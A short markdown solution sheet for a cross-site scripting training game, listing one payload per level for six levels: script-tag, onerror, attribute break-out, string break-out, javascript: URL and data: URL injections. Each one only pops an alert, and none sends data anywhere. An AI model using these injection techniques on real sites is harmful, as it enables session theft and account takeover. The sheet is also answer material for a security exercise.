# Game

- 1 level

`https://xss-game.appspot.com/level1/frame?query=<script>alert("Vzlom")</script>`

- 2 level
`<img onerror="alert('Vzlom')" />`

- 3 level
`https://xss-game.appspot.com/level3/frame#'onerror="alert('Vzlom')"`

- 4 level

`https://xss-game.appspot.com/level4/frame?timer=3', alert("Vzlom"), '`

- 5 level

`https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("Vzlom")`

- 6 level

`https://xss-game.appspot.com/level6/frame#data:text/javascript,alert("Vzlom")`